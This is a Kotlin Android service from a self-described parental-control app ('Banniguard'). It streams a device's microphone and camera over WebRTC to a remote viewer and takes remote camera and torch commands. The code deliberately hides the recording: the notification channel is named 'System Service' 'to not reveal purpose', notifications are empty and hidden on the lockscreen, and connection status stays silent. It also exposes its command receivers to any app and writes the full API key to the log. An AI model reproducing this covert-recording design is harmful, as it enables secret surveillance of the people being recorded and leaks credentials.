package com.bannigaurd.bannikid

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.bannigaurd.bannikid.webrtc.WebRTCManager
import com.bannigaurd.bannikid.webrtc.SignalMessage
import com.bannigaurd.bannikid.StreamType
import com.bannigaurd.bannikid.webrtc.AblySignalManager
import org.webrtc.PeerConnection

class RealtimeService : Service() {

    private val TAG = "RealtimeService"
    private var webRTCManager: WebRTCManager? = null
    private lateinit var deviceId: String
    private lateinit var ablyApiKey: String
    private var currentStreamType: StreamType = StreamType.NONE

    companion object {
        const val NOTIFICATION_CHANNEL_ID = "RealtimeServiceChannel"
        const val NOTIFICATION_ID = 2
    }

    // ✅ FIX: स्टॉप एक्शन के लिए एक ब्रॉडकास्ट रिसीवर बनाएं
    private val stopServiceReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == AppConstants.STOP_ACTION) {
                Log.d(TAG, "🛑 Broadcast received. Stopping streaming and service.")
                stopStreaming()
                stopSelf()
            }
        }
    }

    // ✅ FIX: Camera switch और torch के लिए broadcast receivers
    private val cameraSwitchReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == AppConstants.SWITCH_CAMERA_ACTION) {
                Log.d(TAG, "📷 Camera switch broadcast received")
                handleCameraSwitch()
            }
        }
    }

    private val torchToggleReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == AppConstants.TOGGLE_TORCH_ACTION) {
                Log.d(TAG, "🔦 Torch toggle broadcast received")
                handleTorchToggle()
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "✅ RealtimeService created")

        // ✅ FIX: सर्विस बनते ही सभी रिसीवर्स को रजिस्टर करें
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(stopServiceReceiver, IntentFilter(AppConstants.STOP_ACTION), RECEIVER_EXPORTED)
            registerReceiver(cameraSwitchReceiver, IntentFilter(AppConstants.SWITCH_CAMERA_ACTION), RECEIVER_EXPORTED)
            registerReceiver(torchToggleReceiver, IntentFilter(AppConstants.TOGGLE_TORCH_ACTION), RECEIVER_EXPORTED)
        } else {
            registerReceiver(stopServiceReceiver, IntentFilter(AppConstants.STOP_ACTION))
            registerReceiver(cameraSwitchReceiver, IntentFilter(AppConstants.SWITCH_CAMERA_ACTION))
            registerReceiver(torchToggleReceiver, IntentFilter(AppConstants.TOGGLE_TORCH_ACTION))
        }

        Log.d(TAG, "✅ All broadcast receivers registered")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action
        deviceId = intent?.getStringExtra("DEVICE_ID") ?: ""
        ablyApiKey = intent?.getStringExtra("ABLY_API_KEY") ?: ""

        Log.d(TAG, "🚀 RealtimeService started with action: $action, deviceId: $deviceId")

        // DEBUG: Log all intent extras
        Log.d(TAG, "📋 Intent extras:")
        intent?.extras?.keySet()?.forEach { key ->
            Log.d(TAG, "   - $key: ${intent.extras?.get(key)}")
        }

        if (deviceId.isEmpty() || ablyApiKey.isEmpty()) {
            Log.e(TAG, "❌ Missing deviceId or ablyApiKey")
            Log.e(TAG, "   - deviceId: '$deviceId'")
            Log.e(TAG, "   - ablyApiKey: '${ablyApiKey.take(10)}...'")
            stopSelf()
            return START_NOT_STICKY
        }

        // ✅ FIX: Prevent multiple simultaneous service starts
        synchronized(this) {
            if (currentStreamType != StreamType.NONE) {
                Log.w(TAG, "⚠️ Service already running with stream type: $currentStreamType")
                Log.w(TAG, "   - New action: $action")
                Log.w(TAG, "   - Ignoring duplicate start command")
                return START_NOT_STICKY
            }
        }

        // Check ALL required permissions before proceeding
        if (!hasAllRequiredPermissions()) {
            Log.e(TAG, "❌ Missing required permissions. Requesting permissions...")

            // Create a basic notification for the permission error
            val errorNotification = createErrorNotification("Required permissions missing")
            startForeground(NOTIFICATION_ID, errorNotification)

            // Request missing permissions
            requestMissingPermissions()

            stopSelf()
            return START_NOT_STICKY
        }

        // Create notification
        val notification = createNotification()

        // For Android 12+ (API 31+), we need to specify the foreground service type
        // But first check if we have the required permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) { // API 31
            val hasMicrophonePermission = checkSelfPermission(android.Manifest.permission.FOREGROUND_SERVICE_MICROPHONE) == android.content.pm.PackageManager.PERMISSION_GRANTED
            val hasDataSyncPermission = checkSelfPermission(android.Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC) == android.content.pm.PackageManager.PERMISSION_GRANTED
            val hasCameraPermission = checkSelfPermission(android.Manifest.permission.FOREGROUND_SERVICE_CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED

            Log.d(TAG, "🔐 Foreground service permissions:")
            Log.d(TAG, "   - FOREGROUND_SERVICE_MICROPHONE: ${if (hasMicrophonePermission) "GRANTED" else "DENIED"}")
            Log.d(TAG, "   - FOREGROUND_SERVICE_CAMERA: ${if (hasCameraPermission) "GRANTED" else "DENIED"}")
            Log.d(TAG, "   - FOREGROUND_SERVICE_DATA_SYNC: ${if (hasDataSyncPermission) "GRANTED" else "DENIED"}")

            // CRITICAL FIX: Determine appropriate service type based on action and permissions
            var serviceStarted = false
            val isAudioAction = action == AppConstants.START_AUDIO_ACTION
            val isCameraAction = action == AppConstants.START_CAMERA_ACTION

            // For audio actions, try MICROPHONE first
            if (isAudioAction && hasMicrophonePermission) {
                try {
                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
                    Log.d(TAG, "✅ Foreground service started with MICROPHONE type for audio")
                    serviceStarted = true
                } catch (e: SecurityException) {
                    Log.w(TAG, "⚠️ MICROPHONE type failed for audio: ${e.message}", e)
                }
            }

            // For camera actions, try combined MICROPHONE + CAMERA
            if (isCameraAction && hasMicrophonePermission && hasCameraPermission && !serviceStarted) {
                try {
                    val combinedType = ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                    startForeground(NOTIFICATION_ID, notification, combinedType)
                    Log.d(TAG, "✅ Foreground service started with MICROPHONE+CAMERA type")
                    serviceStarted = true
                } catch (e: SecurityException) {
                    Log.w(TAG, "⚠️ MICROPHONE+CAMERA type failed: ${e.message}", e)
                }
            }

            // Fallback: try just MICROPHONE for camera if combined failed or camera permission missing
            if (isCameraAction && hasMicrophonePermission && !serviceStarted) {
                try {
                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
                    Log.d(TAG, "✅ Foreground service started with MICROPHONE type for camera (fallback)")
                    serviceStarted = true
                } catch (e: SecurityException) {
                    Log.w(TAG, "⚠️ MICROPHONE fallback for camera also failed: ${e.message}", e)
                }
            }

            // Fallback to DATA_SYNC if microphone-based types failed
            if (!serviceStarted && hasDataSyncPermission) {
                try {
                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                    Log.d(TAG, "✅ Foreground service started with DATA_SYNC type (fallback)")
                    serviceStarted = true
                } catch (e: SecurityException) {
                    Log.w(TAG, "⚠️ DATA_SYNC type failed: ${e.message}", e)
                }
            }

            if (!serviceStarted) {
                try {
                    startForeground(NOTIFICATION_ID, notification)
                    Log.d(TAG, "✅ Foreground service started without specific type (final fallback)")
                    serviceStarted = true
                } catch (e: Exception) {
                    Log.e(TAG, "❌ All foreground service attempts failed: ${e.message}", e)
                    val errorNotification = createErrorNotification("Cannot start foreground service")
                    try {
                        startForeground(NOTIFICATION_ID, errorNotification)
                        Log.d(TAG, "✅ Error notification shown")
                    } catch (finalException: Exception) {
                        Log.e(TAG, "❌ Even error notification failed: ${finalException.message}", finalException)
                    }
                    stopSelf()
                    return START_NOT_STICKY
                }
            }

            if (!hasMicrophonePermission && !hasDataSyncPermission) {
                Log.w(TAG, "⚠️ No foreground service permissions granted, but proceeding with basic startForeground")
                try {
                    startForeground(NOTIFICATION_ID, notification)
                    Log.d(TAG, "✅ Foreground service started without permissions (may not work on all devices)")
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Foreground service failed completely: ${e.message}", e)
                    stopSelf()
                    return START_NOT_STICKY
                }
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // API 29
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        // Handle different actions
        when (action) {
            AppConstants.START_AUDIO_ACTION -> {
                Log.d(TAG, "🎤 Starting audio streaming")
                startAudioStreaming()
            }
            AppConstants.START_CAMERA_ACTION -> {
                Log.d(TAG, "📷 Starting camera streaming")
                startCameraStreaming()
            }
            AppConstants.STOP_ACTION -> {
                Log.d(TAG, "🛑 Stopping streaming")
                stopStreaming()
                stopSelf()
                return START_NOT_STICKY
            }
            else -> {
                Log.w(TAG, "⚠️ Unknown action: $action")
                stopSelf()
                return START_NOT_STICKY
            }
        }

        // FIX: Only start signaling connection when explicitly commanded
        // The signaling connection will be started by the WebRTCManager when needed
        Log.d(TAG, "✅ Service initialized successfully - waiting for parent commands")

        // Return START_NOT_STICKY to prevent automatic restart
        return START_NOT_STICKY
    }

    private fun startAudioStreaming() {
        try {
            Log.d(TAG, "🎤 Initializing WebRTC for audio streaming")
            currentStreamType = StreamType.AUDIO_ONLY

            // Check if WebRTCManager instance already exists
            webRTCManager = WebRTCManager.getExistingInstance()

            if (webRTCManager != null) {
                Log.d(TAG, "✅ Using existing WebRTCManager singleton instance")
                // Instance exists, start new connection with audio stream type
                webRTCManager?.startNewConnection(ablyApiKey, deviceId, currentStreamType)
            } else {
                Log.d(TAG, "🆕 Creating new WebRTCManager singleton instance")
                // Create new singleton instance
                webRTCManager = WebRTCManager.getInstance(
                    context = this,
                    streamType = currentStreamType,
                    onSignalToSend = { signal ->
                        Log.d(TAG, "📤 Sending signal: ${signal.type}")
                        // Send signal to parent via Ably with safe sending
                        safeSendSignal(signal)
                    },
                    connectionStateChangeListener = { state ->
                        Log.d(TAG, "🔄 Connection state changed: $state")
                        when (state) {
                            PeerConnection.IceConnectionState.CONNECTED -> {
                                Log.d(TAG, "✅ WebRTC connected - audio streaming active")
                                // Silent for parental control - don't show notification updates
                            }
                            PeerConnection.IceConnectionState.DISCONNECTED -> {
                                Log.w(TAG, "⚠️ WebRTC disconnected")
                                // Silent for parental control
                            }
                            PeerConnection.IceConnectionState.FAILED -> {
                                Log.e(TAG, "❌ WebRTC connection failed")
                                updateNotification("Audio streaming failed") // Only show errors
                            }
                            else -> {
                                // Silent for parental control - don't show connecting status
                            }
                        }
                    }
                )

                // Initialize WebRTC
                webRTCManager?.initialize(ablyApiKey, deviceId)

                // Start new connection
                webRTCManager?.startNewConnection(ablyApiKey, deviceId, currentStreamType)
            }

            Log.d(TAG, "✅ Audio streaming initialized successfully")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start audio streaming: ${e.message}", e)
            updateNotification("Audio streaming failed")
        }
    }

    private fun startCameraStreaming() {
        try {
            Log.d(TAG, "📷 Initializing WebRTC for camera streaming")
            currentStreamType = StreamType.AUDIO_VIDEO

            // Check if WebRTCManager instance already exists
            webRTCManager = WebRTCManager.getExistingInstance()

            if (webRTCManager != null) {
                Log.d(TAG, "✅ Using existing WebRTCManager singleton instance")
                // Instance exists, start new connection with camera stream type
                webRTCManager?.startNewConnection(ablyApiKey, deviceId, currentStreamType)
            } else {
                Log.d(TAG, "🆕 Creating new WebRTCManager singleton instance")
                // Create new singleton instance
                webRTCManager = WebRTCManager.getInstance(
                    context = this,
                    streamType = currentStreamType,
                    onSignalToSend = { signal ->
                        Log.d(TAG, "📤 Sending signal: ${signal.type}")
                        // Send signal to parent via Ably with safe sending
                        safeSendSignal(signal)
                    },
                    connectionStateChangeListener = { state ->
                        Log.d(TAG, "🔄 Connection state changed: $state")
                        when (state) {
                            PeerConnection.IceConnectionState.CONNECTED -> {
                                Log.d(TAG, "✅ WebRTC connected - camera streaming active")
                                // Silent for parental control - don't show notification updates
                            }
                            PeerConnection.IceConnectionState.DISCONNECTED -> {
                                Log.w(TAG, "⚠️ WebRTC disconnected")
                                // Silent for parental control
                            }
                            PeerConnection.IceConnectionState.FAILED -> {
                                Log.e(TAG, "❌ WebRTC connection failed")
                                updateNotification("Camera streaming failed") // Only show errors
                            }
                            else -> {
                                // Silent for parental control - don't show connecting status
                            }
                        }
                    }
                )

                // Initialize WebRTC
                webRTCManager?.initialize(ablyApiKey, deviceId)

                // Start new connection
                webRTCManager?.startNewConnection(ablyApiKey, deviceId, currentStreamType)
            }

            Log.d(TAG, "✅ Camera streaming initialized successfully")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start camera streaming: ${e.message}", e)
            updateNotification("Camera streaming failed")
        }
    }

    private fun stopStreaming() {
        Log.d(TAG, "🚨 INSTANT STOP STREAMING INITIATED")

        try {
            // ✅ FIX: Force immediate WebRTC disconnect
            webRTCManager?.let { manager ->
                try {
                    manager.disconnect()
                    Log.d(TAG, "✅ WebRTC manager disconnected immediately")
                } catch (e: Exception) {
                    Log.w(TAG, "⚠️ Error disconnecting WebRTC manager: ${e.message}")
                }

                // ✅ FIX: Force destroy WebRTC manager instance immediately
                try {
                    WebRTCManager.destroyInstance()
                    Log.d(TAG, "✅ WebRTCManager singleton instance destroyed immediately")
                } catch (e: Exception) {
                    Log.w(TAG, "⚠️ Error destroying WebRTCManager instance: ${e.message}")
                }
            }

            // ✅ FIX: Force disconnect Ably signaling immediately
            try {
                AblySignalManager.disconnect()
                Log.d(TAG, "✅ Ably signaling disconnected immediately")
            } catch (e: Exception) {
                Log.w(TAG, "⚠️ Error disconnecting Ably signaling: ${e.message}")
            }

            // ✅ FIX: Update notification immediately (no delay)
            updateNotification("Streaming stopped")

            Log.d(TAG, "✅ Streaming stopped instantly")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error stopping streaming: ${e.message}", e)
        }
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "System Service", // Generic name to not reveal purpose
                NotificationManager.IMPORTANCE_MIN // Lowest importance - no sound/vibration
            ).apply {
                // Make completely silent for parental control
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                setShowBadge(false) // Don't show badge on app icon
                lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET // Hide on lockscreen
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("") // Empty title
            .setContentText("") // Empty text - no visible content
            .setSmallIcon(android.R.drawable.stat_sys_download) // Generic system icon
            .setOngoing(true) // Required for foreground service
            .setPriority(NotificationCompat.PRIORITY_MIN) // Lowest priority
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hide on lockscreen
            .setShowWhen(false) // Don't show timestamp
            .setAutoCancel(false) // Don't auto-cancel
            .build()
    }

    private fun createErrorNotification(message: String): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "Real-time Streaming",
                NotificationManager.IMPORTANCE_LOW
            )
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("Banniguard Streaming")
            .setContentText(message)
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setOngoing(false)
            .build()
    }

    private fun updateNotification(message: String) {
        // For parental control, don't update notification content to avoid revealing activity
        // Just keep the silent notification as is
        Log.d(TAG, "📱 Notification update: $message (keeping silent for parental control)")

        // Optional: Only update if there's an actual error, otherwise keep silent
        if (message.contains("failed", ignoreCase = true) || message.contains("error", ignoreCase = true)) {
            val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("") // Empty title
                .setContentText("") // Empty text - no visible content
                .setSmallIcon(android.R.drawable.stat_sys_download) // Generic system icon
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setShowWhen(false)
                .setAutoCancel(false)
                .build()

            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.notify(NOTIFICATION_ID, notification)
        }
        // For success states, don't update notification to keep it completely silent
    }

    // Helper method to check all required permissions
    private fun hasAllRequiredPermissions(): Boolean {
        val recordAudioGranted = checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED

        val cameraGranted = checkSelfPermission(android.Manifest.permission.CAMERA) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED

        val foregroundServiceGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            checkSelfPermission(android.Manifest.permission.FOREGROUND_SERVICE_MICROPHONE) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
        } else true

        Log.d(TAG, "🔐 Permission Status:")
        Log.d(TAG, "   - RECORD_AUDIO: ${if (recordAudioGranted) "GRANTED" else "DENIED"}")
        Log.d(TAG, "   - CAMERA: ${if (cameraGranted) "GRANTED" else "DENIED"}")
        Log.d(TAG, "   - FOREGROUND_SERVICE_MICROPHONE: ${if (foregroundServiceGranted) "GRANTED" else "DENIED"}")

        return recordAudioGranted && cameraGranted && foregroundServiceGranted
    }

    // Helper method to request missing permissions
    private fun requestMissingPermissions() {
        try {
            Log.d(TAG, "📱 Requesting missing permissions...")

            // Start permission request activity
            val intent = Intent(this, PermissionRequestActivity::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            intent.putExtra("DEVICE_ID", deviceId)
            intent.putExtra("ABLY_API_KEY", ablyApiKey)
            startActivity(intent)

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to request permissions: ${e.message}", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "☠️ RealtimeService destroyed")

        // ✅ FIX: सर्विस नष्ट होने पर सभी रिसीवर्स को अन-रजिस्टर करें
        try {
            unregisterReceiver(stopServiceReceiver)
            unregisterReceiver(cameraSwitchReceiver)
            unregisterReceiver(torchToggleReceiver)
            Log.d(TAG, "✅ All broadcast receivers unregistered")
        } catch (e: Exception) {
            Log.w(TAG, "⚠️ Error unregistering receivers: ${e.message}")
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_REMOVE)
            } else {
                @Suppress("DEPRECATION")
                stopForeground(true)
            }
            Log.d(TAG, "✅ Foreground service stopped properly")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error stopping foreground service: ${e.message}", e)
        }

        stopStreaming()

        // ✅ FIX: सर्विस के नष्ट होने पर WebRTCManager को पूरी तरह से नष्ट करें
        // यह सबसे ज़रूरी बदलाव है जो बार-बार कनेक्शन की समस्या को ठीक करेगा।
        try {
            WebRTCManager.destroyInstance()
            Log.d(TAG, "✅ WebRTCManager singleton instance destroyed")
        } catch (e: Exception) {
            Log.w(TAG, "⚠️ Error destroying WebRTCManager instance: ${e.message}")
        }

        forceCleanup() // यह सुनिश्चित करने के लिए कि सब कुछ साफ हो गया है।

        Log.d(TAG, "✅ RealtimeService cleanup completed")
    }

    // FIX: Add force cleanup method to ensure complete resource cleanup
    private fun forceCleanup() {
        Log.d(TAG, "🧹 Force cleanup of RealtimeService resources")

        try {
            // Clean up WebRTC manager if it exists
            if (webRTCManager != null) {
                try {
                    webRTCManager?.disconnect()
                    Log.d(TAG, "✅ WebRTC manager force disconnected")
                } catch (e: Exception) {
                    Log.w(TAG, "⚠️ Error during WebRTC manager force disconnect: ${e.message}")
                }
            }

            // Force disconnect Ably signaling
            try {
                AblySignalManager.disconnect()
                Log.d(TAG, "✅ Ably signaling force disconnected")
            } catch (e: Exception) {
                Log.w(TAG, "⚠️ Error during Ably force disconnect: ${e.message}")
            }

            // Clean up any remaining threads or handlers
            try {
                // Force garbage collection hint (not guaranteed but helpful)
                System.gc()
                Log.d(TAG, "✅ Garbage collection requested")
            } catch (e: Exception) {
                Log.w(TAG, "⚠️ Error during garbage collection: ${e.message}")
            }

            Log.d(TAG, "✅ Force cleanup completed")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error during force cleanup: ${e.message}", e)
        }
    }

    // FIX: Add safe signal sending method
    private fun safeSendSignal(signal: SignalMessage) {
        try {
            // Wait for signaling connection before sending
            waitForSignalingConnection {
                try {
                    // Use the WebRTCManager's safeSendSignal method instead
                    webRTCManager?.safeSendSignalPublic(signal)
                    Log.d(TAG, "✅ Signal sent successfully: ${signal.type}")
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Failed to send signal: ${e.message}", e)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error in safeSendSignal: ${e.message}", e)
        }
    }

    // FIX: Add method to wait for signaling connection
    private fun waitForSignalingConnection(callback: () -> Unit) {
        val maxWaitTime = 10000L // 10 seconds
        val checkInterval = 200L // 200ms
        var elapsedTime = 0L

        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                // Check if WebRTCManager is initialized and connected
                if (webRTCManager != null && webRTCManager?.isSignalingConnected() == true) {
                    Log.d(TAG, "✅ Signaling connection ready, executing callback")
                    callback()
                } else if (elapsedTime >= maxWaitTime) {
                    Log.w(TAG, "⚠️ Signaling connection timeout, executing callback anyway")
                    callback()
                } else {
                    elapsedTime += checkInterval
                    handler.postDelayed(this, checkInterval)
                }
            }
        }

        handler.post(runnable)
    }

    // ✅ FIX: Handle camera switch operations
    private fun handleCameraSwitch() {
        try {
            Log.d(TAG, "📷 Executing camera switch operation")
            webRTCManager?.switchCamera { success ->
                if (success) {
                    Log.d(TAG, "✅ Camera switch completed successfully")
                } else {
                    Log.w(TAG, "⚠️ Camera switch failed")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error during camera switch: ${e.message}", e)
        }
    }

    // ✅ FIX: Handle torch toggle operations
    private fun handleTorchToggle() {
        try {
            Log.d(TAG, "🔦 Executing torch toggle operation")
            val success = webRTCManager?.toggleTorch() ?: false
            if (success) {
                Log.d(TAG, "✅ Torch toggle completed successfully")
            } else {
                Log.w(TAG, "⚠️ Torch toggle failed or not supported")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error during torch toggle: ${e.message}", e)
        }
    }
}
